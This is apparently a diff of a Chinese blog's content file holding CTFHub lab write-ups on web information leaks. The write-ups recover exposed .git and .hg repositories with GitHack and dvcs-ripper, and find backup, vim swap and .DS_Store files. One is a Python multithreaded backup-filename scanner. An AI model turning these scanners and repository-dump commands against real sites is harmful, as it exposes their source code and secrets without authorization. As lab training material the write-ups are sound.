+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><div class="tabs" id="tab-信息泄露-git泄露"><ul class="nav-tabs"><li class="tab active"><a class="#信息泄露-git泄露-1">题目-Log</a></li><li class="tab"><a class="#信息泄露-git泄露-2">题目-Stash</a></li><li class="tab"><a class="#信息泄露-git泄露-3">题目-Index</a></li></ul><div class="tab-content"><div class="tab-pane active" id="信息泄露-git泄露-1"><h3 id="题目-Log"><a href="#题目-Log" class="headerlink" title="题目-Log"></a>题目-Log</h3>  <div class="note p-4 mb-4 rounded-small info">
+    <p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题。</p>
+
+  </div>
+
 <p>根据题目提示，提前准备工具需要用到<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>打开靶场，页面上很空白，根据题目进行.git文件泄露的恢复操作</p>
 <p><img  
@@ -1489,7 +1836,7 @@ import {initHBE} from "/js/plugins/hbe.js";
                       alt="image-20240912213235037"
                 ></p>
 <p>接下来用网站目录扫描工具，这里用的<a class="link"   href="https://github.com/maurosoria/dirsearch" >dirsearch <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（可以用御剑等等）</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u 目标地址</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u 目标地址</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
@@ -1523,7 +1870,7 @@ import {initHBE} from "/js/plugins/hbe.js";
 <p><a class="link"   href="https://github.com/lijiejie/GitHack" >https://github.com/lijiejie/GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 用于python3，但恢复效果一般</p>
 <p><a class="link"   href="https://github.com/BugScanTeam/GitHack" >https://github.com/BugScanTeam/GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 用于python2，效果不错</p>
 </blockquote>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py 目标地址/.git</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py 目标地址/.git</span><br></pre></td></tr></table></figure></div>
 
 <p><img  
                      lazyload
@@ -1555,10 +1902,118 @@ import {initHBE} from "/js/plugins/hbe.js";
                      data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2-Log/image-20240912220806774.png"
                       alt="image-20240912220806774"
                 ></p>
-<p>最终我们通过.git文件泄露，回退版本得到了flag</p>
-<h2 id="题目-Stash"><a href="#题目-Stash" class="headerlink" title="题目-Stash"></a>题目-Stash</h2><h2 id="题目-Index"><a href="#题目-Index" class="headerlink" title="题目-Index"></a>题目-Index</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做题时要根据题目来做题，半做半猜，不要盲目乱入手</p>
+<p>最终我们通过.git文件泄露，回退版本得到了flag</p></div><div class="tab-pane" id="信息泄露-git泄露-2"><h3 id="题目-Stash"><a href="#题目-Stash" class="headerlink" title="题目-Stash"></a>题目-Stash</h3>  <div class="note p-4 mb-4 rounded-small info">
+    <p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用<code>BugScanTeam的GitHack</code>完成本题</p>
+
+  </div>
+
+<p>与log文件的恢复相同，仅有一点变化</p>
+<p>打开靶场，用工具<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行.git文件恢复</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http://你的靶场地址/.git</span><br></pre></td></tr></table></figure></div>
+
+<p>进入dist内生成的文件，输入</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git stash list</span><br><span class="line">git stash pop</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/image-20240917180019024.png"
+                      alt="image-20240917180019024"
+                ></p>
+<p>成功恢复一个<code>.txt</code>文件，打开就可以得到<code>flag</code>了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/image-20240917180115597.png"
+                      alt="image-20240917180115597"
+                ></p></div><div class="tab-pane" id="信息泄露-git泄露-3"><h3 id="题目-Index"><a href="#题目-Index" class="headerlink" title="题目-Index"></a>题目-Index</h3>  <div class="note p-4 mb-4 rounded-small info">
+    <p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用<code>BugScanTeam的GitHack</code>完成本题</p>
+
+  </div>
+
+<p>与前面也是一样的</p>
+<p>打开靶场，用工具<a class="link"   href="https://github.com/BugScanTeam/GitHack" >GitHack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>进行.git文件恢复</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http://你的靶场地址/.git</span><br></pre></td></tr></table></figure></div>
+
+<p>恢复后进入文件夹直接</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git show</span><br></pre></td></tr></table></figure></div>
+
+<p>flag就出来了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-Git%E6%B3%84%E9%9C%B2/image-20240917180700233.png"
+                      alt="image-20240917180700233"
+                ></p></div></div></div>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做题时要根据题目来做题，半做半猜，不要盲目乱入手</p>
 <p>在实际做题时会遇到各种坑，需要多花耐心慢慢琢磨（由于本人也是新手，也花了好些时间搞这节。。。）</p>
 <p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;信息泄露-&gt;git泄露</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>writeup</category>
+        <category>web</category>
+        <category>ctfhub</category>
+      </categories>
+      <tags>
+        <tag>writeup</tag>
+        <tag>信息泄露</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息泄露-HG泄露</title>
+    <url>/2024/09/17/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2/</url>
+    <content><![CDATA[<h1 id="信息泄露-HG泄露"><a href="#信息泄露-HG泄露" class="headerlink" title="信息泄露-HG泄露"></a>信息泄露-HG泄露</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2>
+  <div class="note p-4 mb-4 rounded-small info">
+    <p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>
+
+  </div>
+
+<p>打开靶场，这道题比较陌生，所以需要参考其他资料来完成<a class="link"   href="https://blog.csdn.net/hxhxhxhxx/article/details/112759999?ops_request_misc=%7B%22request_id%22:%22169586988116800226538806%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=169586988116800226538806&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-112759999-null-null.142%5Ev94%5Einsert_down28v1&utm_term=ctfhub%E6%8A%80%E8%83%BD%E6%A0%91&spm=1018.2226.3001.4187" >CTFHUB技能树（全详细解析含进阶）-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2/image-20240917181428325.png"
+                      alt="image-20240917181428325"
+                ></p>
+<p>根据资料也是和.SVN一样的恢复方式</p>
+<p>使用工具，<a class="link"   href="https://github.com/kost/dvcs-ripper" >dvsc-ripper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>这个工具需要很多环境和包，所以建议在kali里面执行</p>
+<p>进入kali，安装工具所需依赖库</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure></div>
+
+<p>安装完后，进入到工具目录，执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./rip-hg.pl -v -u 地址/.hg/</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2/image-20240917182029336.png"
+                      alt="image-20240917182029336"
+                ></p>
+<p>进入.hg文件，深度查找flag文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2/image-20240917182149228.png"
+                      alt="image-20240917182149228"
+                ></p>
+<p>回到靶场添加目录文件即可得到flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2/image-20240917182221366.png"
+                      alt="image-20240917182221366"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-HG%E6%B3%84%E9%9C%B2/image-20240917182227738.png"
+                      alt="image-20240917182227738"
+                ></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这种题目考察的不多，主要就是了解一下有这么个信息可能会泄露，然后工具的使用会操作就行</p>
+<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;信息泄露-&gt;hg泄露</p>
 ]]></content>
       <categories>
         <category>ctf</category>
@@ -1687,6 +2142,149 @@ import {initHBE} from "/js/plugins/hbe.js";
 <p>最后flag被找出来，又解决了一道题</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个题目虽然与git泄露类似，但因为是svn，所以恢复起来没那么常见，这个文件我也是在CSDN上面的writeup找到的，初学者遇到完全没思路或者已经行不通的时候就多去网上找找资料，慢慢培养能力</p>
 <p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;信息泄露-&gt;svn泄露</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>writeup</category>
+        <category>web</category>
+        <category>ctfhub</category>
+      </categories>
+      <tags>
+        <tag>writeup</tag>
+        <tag>信息泄露</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息泄露-备份文件下载</title>
+    <url>/2024/09/16/ctf/writeup/web/ctfhub/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
+    <content><![CDATA[<h1 id="信息泄露-备份文件下载"><a href="#信息泄露-备份文件下载" class="headerlink" title="信息泄露-备份文件下载"></a>信息泄露-备份文件下载</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://www.ctfhub.com/" >CTFHUB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，比较官方的一个大型练习靶场</p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><div class="tabs" id="tab-信息泄露-备份文件下载"><ul class="nav-tabs"><li class="tab active"><a class="#信息泄露-备份文件下载-1">题目-网站源码</a></li><li class="tab"><a class="#信息泄露-备份文件下载-2">题目-bak文件</a></li><li class="tab"><a class="#信息泄露-备份文件下载-3">题目-vim缓存</a></li><li class="tab"><a class="#信息泄露-备份文件下载-4">题目-.DS_Store</a></li></ul><div class="tab-content"><div class="tab-pane active" id="信息泄露-备份文件下载-1"><h3 id="题目-网站源码"><a href="#题目-网站源码" class="headerlink" title="题目-网站源码"></a>题目-网站源码</h3>  <div class="note p-4 mb-4 rounded-small info">
+    <p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
+
+  </div>
+
+<p>打开靶场看到有提示网站源码的备份文件信息</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240916154942458.png"
+                      alt="image-20240916154942458"
+                ></p>
+<p>而接下来就是添加网站后缀看看有哪些是被备份没删除的</p>
+<p>这里提供两种办法</p>
+<ol>
+<li><p>自己编写脚本实现多线程访问，我提供一个自己写的脚本可以参考一下</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="comment"># url为被扫描地址，后不加‘/’</span></span><br><span class="line">url1 = <span class="string">&#x27;http://xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见的网站源码备份文件名</span></span><br><span class="line">list1 = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;2010&#x27;</span>, <span class="string">&#x27;2011&#x27;</span>, <span class="string">&#x27;2012&#x27;</span>, <span class="string">&#x27;2013&#x27;</span>, <span class="string">&#x27;2014&#x27;</span>, <span class="string">&#x27;2015&#x27;</span>, <span class="string">&#x27;2016&#x27;</span>, <span class="string">&#x27;2017&#x27;</span>, <span class="string">&#x27;2018&#x27;</span>, <span class="string">&#x27;2019&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;2020&#x27;</span>, <span class="string">&#x27;2021&#x27;</span>, <span class="string">&#x27;2022&#x27;</span>, <span class="string">&#x27;2023&#x27;</span>, <span class="string">&#x27;2024&#x27;</span>, <span class="string">&#x27;2025&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;archive&#x27;</span>, <span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;aspx&#x27;</span>, <span class="string">&#x27;auth&#x27;</span>, <span class="string">&#x27;back&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;backups&#x27;</span>, <span class="string">&#x27;bak&#x27;</span>, <span class="string">&#x27;bbs&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;clients&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;com&#x27;</span>, <span class="string">&#x27;customers&#x27;</span>, <span class="string">&#x27;dat&#x27;</span>, <span class="string">&#x27;data&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;database&#x27;</span>, <span class="string">&#x27;db&#x27;</span>, <span class="string">&#x27;dump&#x27;</span>, <span class="string">&#x27;engine&#x27;</span>, <span class="string">&#x27;error_log&#x27;</span>, <span class="string">&#x27;faisunzip&#x27;</span>, <span class="string">&#x27;files&#x27;</span>, <span class="string">&#x27;forum&#x27;</span>, <span class="string">&#x27;home&#x27;</span>, <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;joomla&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;jsp&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;master&#x27;</span>, <span class="string">&#x27;media&#x27;</span>, <span class="string">&#x27;members&#x27;</span>, <span class="string">&#x27;my&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;old&#x27;</span>, <span class="string">&#x27;orders&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;sql&#x27;</span>, <span class="string">&#x27;store&#x27;</span>, <span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;users&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;vb&#x27;</span>, <span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>, <span class="string">&#x27;wp&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line"><span class="comment"># 常见的网站源码备份文件后缀</span></span><br><span class="line">list2 = [<span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;.rar&#x27;</span>, <span class="string">&#x27;.tar.gz&#x27;</span>, <span class="string">&#x27;.tgz&#x27;</span>, <span class="string">&#x27;.tar.bz2&#x27;</span>, <span class="string">&#x27;.tar&#x27;</span>, <span class="string">&#x27;.jar&#x27;</span>, <span class="string">&#x27;.war&#x27;</span>, <span class="string">&#x27;.7z&#x27;</span>, <span class="string">&#x27;.bak&#x27;</span>, <span class="string">&#x27;.sql&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;.gz&#x27;</span>, <span class="string">&#x27;.sql.gz&#x27;</span>, <span class="string">&#x27;.tar.tgz&#x27;</span>]</span><br><span class="line"><span class="comment"># 定义一个函数来进行请求，并检查状态码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_url</span>(<span class="params">file_name</span>):</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;url1&#125;</span>/<span class="subst">&#123;file_name&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;file_name&#125;</span>\n&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error accessing <span class="subst">&#123;url&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用多线程执行URL请求</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan_backup_files</span>():</span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">50</span>) <span class="keyword">as</span> executor:  <span class="comment"># 创建50个线程</span></span><br><span class="line">        <span class="comment"># 构造所有的文件名并提交给线程池</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">                back = <span class="string">f&quot;<span class="subst">&#123;i&#125;</span><span class="subst">&#123;j&#125;</span>&quot;</span>  <span class="comment"># 组合文件名</span></span><br><span class="line">                executor.submit(check_url, back)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行扫描</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;能够访问到的网站后缀有:&quot;</span>)</span><br><span class="line">scan_backup_files()</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>用开源工具进行访问**<a class="link"   href="https://github.com/VMsec/ihoneyBakFileScan_Modify" >ihoneyBakFileScan_Modify <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>**</p>
+</li>
+</ol>
+<p>扫描完会发现能访问到<code>www.zip</code>文件，下载下来后有<code>flag文件</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917142347669.png"
+                      alt="image-20240917142347669"
+                ></p>
+<p>直接打开没有，就在网页访问看看</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917142416724.png"
+                      alt="image-20240917142416724"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240916155518068.png"
+                      alt="image-20240916155518068"
+                ></p>
+<p>恭喜，访问成功！拿到flag。</p></div><div class="tab-pane" id="信息泄露-备份文件下载-2"><h3 id="题目-bak文件"><a href="#题目-bak文件" class="headerlink" title="题目-bak文件"></a>题目-bak文件</h3>  <div class="note p-4 mb-4 rounded-small info">
+    <p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
+
+  </div>
+
+<p>打开靶场看到提示说flag文件在<code>index.php</code>中，结合题目说明这个文件被备份到<code>.bak</code>文件了，所以我们尝试访问<code>index.php.bak</code>，发现能有文件被下载，打开文件就可以看到flag了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240916160032682.png"
+                      alt="image-20240916160032682"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240916160059293.png"
+                      alt="image-20240916160059293"
+                ></p></div><div class="tab-pane" id="信息泄露-备份文件下载-3"><h3 id="题目-vim缓存"><a href="#题目-vim缓存" class="headerlink" title="题目-vim缓存"></a>题目-vim缓存</h3>  <div class="note p-4 mb-4 rounded-small info">
+    <p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p>
+
+  </div>
+
+<blockquote>
+<p>vim缓存时linux里面的缓存隐藏文件</p>
+</blockquote>
+<p>打开靶场，根据题目和看到提示flag在index.php里面，php文件肯定以vim的形式备份了，所以我们以vim缓存文件恢复即可，所以 &#x2F;.index.php.swp 直接下载</p>
+  <div class="note p-4 mb-4 rounded-small warning">
+    <p>隐藏文件，记得加点访问</p>
+
+  </div>
+
+
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917171052845.png"
+                      alt="image-20240917171052845"
+                ></p>
+<blockquote>
+<p>vim的备份文件后缀位.swp，并且需要用<code>vim 文件名（无.swp）</code>来重新访问，windows直接打开是16进制的，更换编码格式为UTF-8，或者用linux系统打开</p>
+</blockquote>
+<p>打开后就可以找到flag了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917172655327.png"
+                      alt="image-20240917172655327"
+                ></p></div><div class="tab-pane" id="信息泄露-备份文件下载-4"><h3 id="题目-DS-Store"><a href="#题目-DS-Store" class="headerlink" title="题目-.DS_Store"></a>题目-.DS_Store</h3>  <div class="note p-4 mb-4 rounded-small info">
+    <p><code>.DS_Store</code> 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过<code>.DS_Store</code>可以知道这个目录里面所有文件的清单。</p>
+
+  </div>
+
+<p>打开靶场，看到备份文件下载，直接加<code>.DS_Store</code>访问，得到一个下载文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917173751838.png"
+                      alt="image-20240917173751838"
+                ></p>
+<blockquote>
+<p>文件需要在linux系统打开，或者在windows系统用UTF-8&#x2F;UTF-16格式打开</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917174419780.png"
+                      alt="image-20240917174419780"
+                ></p>
+<p>发现一串文件名，在靶场中访问看看</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917174533485.png"
+                      alt="image-20240917174533485"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../../../../images/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/image-20240917174538337.png"
+                      alt="image-20240917174538337"
+                ></p>
+<p>成功得到flag！</p></div></div></div>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这些题都属于文件备份不当，导致备份文件泄露，最主要的就是下载后用不同格式打开文件，整体还是简单的</p>
+<p><a class="link"   href="https://www.ctfhub.com/#/skilltree" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>路径为web-&gt;信息泄露-&gt;备份文件下载</p>
 ]]></content>
       <categories>
         <category>ctf</category>
